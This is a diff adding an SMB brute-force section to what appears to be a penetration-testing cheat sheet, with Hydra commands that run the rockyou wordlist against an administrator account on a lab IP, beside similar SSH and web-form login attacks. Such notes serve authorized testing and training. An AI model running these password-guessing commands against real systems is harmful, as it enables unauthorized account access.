@@ -216,6 +216,13 @@ hydra -l [username] -P [path to pass-wordlist] [IP Target] -t 4 ssh
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 -t 4 ssh 
 ```
 
+- ### SMB Bruteforce
+hydra -t 1 -V -f -l administrator -P [path to pass-wordlist] 10.10.10.11 smb
+###### Example :
+```
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb
+```
+
 - ### Post Web Form
 hydra -l [username] -P [path to pass-wordlist] [IP Target] http-post-form "/[login webpage]:username=^USER^&password=^PASS^:F=[Failed login message]" -V 
 ###### Example :
